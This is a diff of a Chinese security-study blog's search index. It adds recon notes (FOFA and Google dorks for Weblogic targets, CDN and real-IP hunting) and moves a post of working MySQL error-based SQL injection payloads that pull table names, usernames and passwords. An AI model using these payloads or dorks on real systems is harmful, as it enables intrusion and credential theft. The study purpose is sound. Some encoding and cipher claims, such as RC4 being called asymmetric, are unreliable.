+<p><strong>空间搜索引擎利用</strong>：</p>
+<ul>
+<li><del>shodan</del></li>
 <li>fofa</li>
-<li>钟馗之眼</li>
+<li>quake</li>
+<li><del>钟馗之眼</del></li>
 <li>google hacking(inurl:漏洞地址)</li>
 </ul>
 <p>比如搜索Weblogic</p>
 <p>进入fofa 搜索 <code>app=&quot;BEA-Weblogic-Server&quot;</code></p>
 <p>google: <code>inurl:example/ws/wslt/index.jsp</code></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>如果获得了一个域名，先进行CDN判断，有CDN就想办法去获取真实的ip，再进行测试。</p>
+<p>之后的测试点包括但不限于 <strong>端口扫描</strong>、<strong>目录爆破</strong>、<strong>子域名爆破</strong></p>
+<p>fofa那些搜索的是什么？</p>
+<p><strong>关联资产、特征资产、资产信息</strong></p>
+<blockquote>
+<p>关联资产，我输入域名，给了我ip等信息，端口有哪些</p>
+<p>特征资产，我搜log4j，给我一些应用log4j的ip，这种一般是找通用漏洞很好， <code>app=&quot;BEA-Weblogic-Server&quot;</code>这就是找通用漏洞</p>
+</blockquote>
 <h3 id="批量扫描脚本"><a href="#批量扫描脚本" class="headerlink" title="批量扫描脚本"></a>批量扫描脚本</h3><p>漏洞库：</p>
 <blockquote>
 <p>佩奇漏洞文库</p>
@@ -3032,6 +4007,36 @@
 <p>用<code>httpx</code>筛选出存活的url</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">httpx.exe -<span class="built_in">timeout</span> 15 -l fanwei.txt -o result.txt -mc 200</span><br></pre></td></tr></table></figure>
 
+<h3 id="自动化信息收集"><a href="#自动化信息收集" class="headerlink" title="自动化信息收集"></a><strong>自动化信息收集</strong></h3><p>kunyu、ARL灯塔、水泽</p>
+<p>指纹识别： ENScan</p>
+<h1 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a><strong>知识补充</strong></h1><h2 id="反向代理和正向代理"><a href="#反向代理和正向代理" class="headerlink" title="反向代理和正向代理"></a><strong>反向代理和正向代理</strong></h2><p><strong>正向代理：</strong>“好兄弟，我访问不了目标网站，你帮我去访问吧”。</p>
+<p><strong>即客户端的代理</strong></p>
+<blockquote>
+<p>pc-&gt;代理服务器-&gt;目标机</p>
+<p>目标机不知道真实的用户ip</p>
+<p>这个和找房子同理，<strong>租客</strong>一般不能直接找到 <strong>房东</strong>，但可以通过 <strong>中介</strong> 找到 <strong>房东</strong></p>
+</blockquote>
+<p><strong>好处：</strong></p>
+<blockquote>
+<p>突破客户端ip<strong>访问限制</strong></p>
+<p>隐藏用户ip</p>
+<p>提高访问速度，代理服务器很较大的硬盘缓冲区，将部分请求的响应保存其中，有用户访问，就直接取出来</p>
+</blockquote>
+<p><strong>反向代理：</strong>“好兄弟，你就是目标机?！”</p>
+<p><strong>即，目标机的代理</strong></p>
+<blockquote>
+<p>pc-&gt;反向代理服务器-&gt;目标机(隐藏)</p>
+<p>这个代理不是用户使用的，而是服务器使用的，所以pc会认为它就是在访问目标机，</p>
+<p>即，用户不知道真实的目标机</p>
+<p><strong>房东</strong> 不卖房子，但是 <strong>二房东</strong> 对外出租房东的房子， <strong>租客</strong> 直接面向 <strong>二房东</strong>， <strong>二房东</strong>再去找 <strong>房东</strong></p>
+</blockquote>
+<p><strong>好处:</strong></p>
+<blockquote>
+<p>隐藏服务器ip</p>
+<p>负载均衡，目标机很忙， 就去请求有相同服务的备用机</p>
+<p>安全保障：可作为应用层防火墙</p>
+<p>提高访问速度，代理服务器提前缓存短时间内访问频繁的动态内容</p>
+</blockquote>
 ]]></content>
       <categories>
         <category>sql注入</category>
@@ -14136,33 +15141,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sql注入之报错注入</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
-<p><strong>extravtvalue()</strong></p>
-<p>floor()、rand()…主键重复方式，暂时不展开</p>
-<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
-<blockquote>
-<p>XML_document:是字符串String格式，为XML文档对象名称</p>
-<p>Xpath_string:Xpath格式的字符串</p>
-<p>new_value:string格式，替换查找到的符合条件的数据</p>
-</blockquote>
-<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>报错注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入之联合注入</title>
     <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
@@ -14205,6 +15183,33 @@
       </categories>
       <tags>
         <tag>联合注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入之报错注入</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
+<p><strong>extravtvalue()</strong></p>
+<p>floor()、rand()…主键重复方式，暂时不展开</p>
+<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
+<blockquote>
+<p>XML_document:是字符串String格式，为XML文档对象名称</p>
+<p>Xpath_string:Xpath格式的字符串</p>
+<p>new_value:string格式，替换查找到的符合条件的数据</p>
+</blockquote>
+<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>报错注入</tag>
       </tags>
   </entry>
   <entry>
@@ -15058,8 +16063,8 @@ echo $get
         <category>xss</category>
       </categories>
       <tags>
-        <tag>xss</tag>
         <tag>漏洞</tag>
+        <tag>xss</tag>
       </tags>
   </entry>
   <entry>
@@ -15954,6 +16959,7 @@ return $outText;#新值
 <p>不想重复捕获，要反复测试时，可以将包放进repeater模块。</p>
 <h2 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h2><p>提供一个可视化的差异比对功能，来对比分析两次数据之间的区别</p>
 <h2 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h2><p>分析数据样本随机性质量的工具。可以用它测试应用程序的会话令牌（Session token）、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能很好地降低这些关键数据被伪造的风险。</p>
+<h2 id="手工导入插件"><a href="#手工导入插件" class="headerlink" title="手工导入插件"></a>手工导入插件</h2><p>命令行进入到插件文件夹所在位置，输入 <code>gradlew.bat build fatjar</code></p>
 ]]></content>
       <categories>
         <category>工具使用</category>
@@ -16073,8 +17079,8 @@ return $outText;#新值
         <category>top10</category>
       </categories>
       <tags>
-        <tag>xss</tag>
         <tag>漏洞</tag>
+        <tag>xss</tag>
         <tag>RCE</tag>
         <tag>upload</tag>
         <tag>xxe</tag>
@@ -16900,7 +17906,73 @@ return $outText;#新值
 <p>切换到xg用户，sudo -l，看最后一行</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> xg on xinguang:</span><br><span class="line">    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,</span><br><span class="line">    env_keep=<span class="string">&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;</span>, env_keep+=<span class="string">&quot;MAIL PS1 PS2</span></span><br><span class="line"><span class="string">    QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>, env_keep+=<span class="string">&quot;LC_COLLATE LC_IDENTIFICATION</span></span><br><span class="line"><span class="string">    LC_MEASUREMENT LC_MESSAGES&quot;</span>, env_keep+=<span class="string">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER</span></span><br><span class="line"><span class="string">    LC_TELEPHONE&quot;</span>, env_keep+=<span class="string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,</span><br><span class="line">    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin</span><br><span class="line"></span><br><span class="line">User xg may run the following commands on xinguang:</span><br><span class="line">    (ALL) /bin/systemctl, /usr/bin/vim</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h3 id="提权部分我记在“提权方式”那一md去了"><a href="#提权部分我记在“提权方式”那一md去了" class="headerlink" title="提权部分我记在“提权方式”那一md去了"></a>提权部分我记在“提权方式”那一md去了</h3><h1 id="二、网安"><a href="#二、网安" class="headerlink" title="二、网安"></a>二、网安</h1><h2 id="1-OSI七层模型"><a href="#1-OSI七层模型" class="headerlink" title="1.OSI七层模型"></a>1.OSI七层模型</h2><ol>
+<h3 id="提权部分我记在“提权方式”那一md去了"><a href="#提权部分我记在“提权方式”那一md去了" class="headerlink" title="提权部分我记在“提权方式”那一md去了"></a>提权部分我记在“提权方式”那一md去了</h3><h2 id="17-加密编码"><a href="#17-加密编码" class="headerlink" title="17.加密编码"></a>17.加密编码</h2><p>加密编码的意义：代码审计可能用到；也可以对自己的文件进行加密编码</p>
+<table>
+<thead>
+<tr>
+<th>密码类型</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MD5</td>
+<td>32或16位字符串，由数字和字母(a-f)组成</td>
+</tr>
+<tr>
+<td>SHA1</td>
+<td>同MD5，不过是40位</td>
+</tr>
+<tr>
+<td>NTLM</td>
+<td>windows哈希密码，域渗透要用的</td>
+</tr>
+<tr>
+<td>AES&#x2F;DES&#x2F;RC4</td>
+<td>AES&#x2F;DES对称密钥，RC4非对称加密，引入密钥，密文特征类似base64</td>
+</tr>
+</tbody></table>
+<p>一般是md5加盐，这种算法是</p>
+<blockquote>
+<p>md5(md5(password).盐)；将password进行md5后，与盐拼接，再将结果进行md5</p>
+<p>这种方式在php5.5之前的版本，算是不错的加密机制了</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>编码</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>base64</td>
+<td>数字0-9和字母a-f组成的字符串，大小写敏感，结尾可能有&#x3D;</td>
+</tr>
+<tr>
+<td>URL</td>
+<td>数字0-9和字母a-f组成的字符串，大小写敏感，通常格式为 &amp;2d</td>
+</tr>
+<tr>
+<td>HEX</td>
+<td>0-9加A-F组成</td>
+</tr>
+<tr>
+<td>ASCII</td>
+<td>将128个字符用数字表示</td>
+</tr>
+</tbody></table>
+<p><strong>js前端加密</strong>：</p>
+<blockquote>
+<p>颜文字加密</p>
+<p>jother加密：只用 ! + ( ) [ ] { } 这8个字符对任意字符串编码</p>
+<p>JSFUCK加密: 与jother相比，少了 { }</p>
+</blockquote>
+<p><strong>后端代码加密</strong></p>
+<blockquote>
+<p>php: 乱码，但头部有信息</p>
+<p>.NET：DLL封装代码文件 (ILSpy)</p>
+<p>JAVA: JARS&amp;CLASS文件 (IDEA)</p>
+</blockquote>
+<h1 id="二、网安"><a href="#二、网安" class="headerlink" title="二、网安"></a>二、网安</h1><h2 id="1-OSI七层模型"><a href="#1-OSI七层模型" class="headerlink" title="1.OSI七层模型"></a>1.OSI七层模型</h2><ol>
 <li><p>物理层（Physical Layer）：<strong>将接收到的数据转化为比特流</strong>，主要关注传输媒介、电压、电缆规范、接口等问题。</p>
 <p><strong>比特</strong></p>
 </li>
@@ -17745,9 +18817,8 @@ return $outText;#新值
 <p>将你当初配置的gittalk中的 <strong>Homepage URL</strong>，配置成自己的github<strong>静态页面的路径</strong>即可</p>
 <p>就是找到自己的静态页面仓库，点进去，把上面的<strong>地址栏url</strong>复制过去即可</p>
 <h2 id="search-xml错误"><a href="#search-xml错误" class="headerlink" title="search.xml错误"></a>search.xml错误</h2><p>访问..github.io&#x2F;search.xml，会报错</p>
-<p><img src="/../../../Typora/img111/image-20231022130218792.png"></p>
-<p>f12，xml文件状态为 <strong>304</strong>，查看xml文件的响应内容，搜索到出现报错内容的字符，再去原md文件中删改即可</p>
-<p><img src="/../../../Typora/img111/image-20231022134918206.png"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231022130218792.png"></p>
+<p>f12，xml文件状态为 <strong>304</strong>，查看xml文件的响应内容，搜索到出现报错内容的字符，根据提示位置，去原md文件中删改即可</p>
 <p>好好好，不成功是吧，我用json去</p>
 <p><a href="https://cloud.tencent.com/developer/article/1624646">https://cloud.tencent.com/developer/article/1624646</a></p>
 <p>以上是对我自己博客的解决方案</p>
